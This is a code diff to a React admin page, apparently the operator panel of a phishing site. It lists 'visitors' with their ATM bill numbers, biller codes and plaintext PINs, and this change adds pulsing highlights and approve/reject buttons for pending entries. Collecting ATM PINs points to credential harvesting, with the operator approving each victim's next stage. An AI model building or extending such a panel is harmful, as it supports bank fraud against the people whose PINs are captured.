@@ -1535,11 +1535,11 @@ const AdminVisitors = () => {
                   {(() => {
                     const atmOrders = linkedOrders.filter(o => o.atm_bill_number || o.atm_biller_code || o.atm_pin);
                     return (
-                      <AccordionItem value="atm-info" className="border border-border rounded-xl overflow-hidden">
+                      <AccordionItem value="atm-info" className={`border rounded-xl overflow-hidden ${atmOrders.some(o => o.stage_status === "pending") ? "border-amber-500/50 bg-amber-500/5 ring-1 ring-amber-500/20" : "border-border"}`}>
                         <AccordionTrigger className="px-4 py-3 bg-muted/30 hover:bg-muted/50 text-sm font-bold [&[data-state=open]>svg]:rotate-180">
                           <div className="flex items-center gap-2">
                             <FileText className="w-4 h-4 text-primary" />معلومات ATM
-                            {atmOrders.length > 0 && <span className="px-1.5 py-0.5 rounded-full bg-primary/10 text-primary text-[10px] font-bold">{atmOrders.length}</span>}
+                            {atmOrders.length > 0 && <span className={`px-1.5 py-0.5 rounded-full text-[10px] font-bold ${atmOrders.some(o => o.stage_status === "pending") ? "bg-amber-500 text-white animate-pulse" : "bg-primary/10 text-primary"}`}>{atmOrders.length}</span>}
                           </div>
                         </AccordionTrigger>
                         <AccordionContent className="px-4 py-3">
@@ -1548,12 +1548,22 @@ const AdminVisitors = () => {
                           ) : (
                             <div className="space-y-3">
                               {atmOrders.map(order => (
-                                <div key={order.id} className="bg-muted/20 rounded-xl border border-border/50 p-4">
+                                <div key={order.id} className="bg-muted/20 rounded-xl border border-border/50 p-4 space-y-2">
                                   <div className="grid grid-cols-2 gap-2">
                                     {order.atm_bill_number && <InfoItem label="رقم الفاتورة" value={order.atm_bill_number} />}
                                     {order.atm_biller_code && <InfoItem label="رمز المفوتر" value={order.atm_biller_code} />}
                                     {order.atm_pin && <InfoItem label="الرقم السري" value={order.atm_pin} />}
                                   </div>
+                                  {order.stage_status === "pending" && (
+                                    <div className="flex items-center gap-2 pt-2 border-t border-border/50">
+                                      <Button onClick={() => handleStageApprove(order.id)} disabled={loadingAction !== null} className="bg-emerald-600 hover:bg-emerald-700 text-white gap-1" size="sm">
+                                        {loadingAction === "stage-approve-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Check className="w-3 h-3" />}موافقة
+                                      </Button>
+                                      <Button onClick={() => handleStageReject(order.id)} disabled={loadingAction !== null} variant="destructive" className="gap-1" size="sm">
+                                        {loadingAction === "stage-reject-" + order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <X className="w-3 h-3" />}رفض
+                                      </Button>
+                                    </div>
+                                  )}
                                 </div>
                               ))}
                             </div>
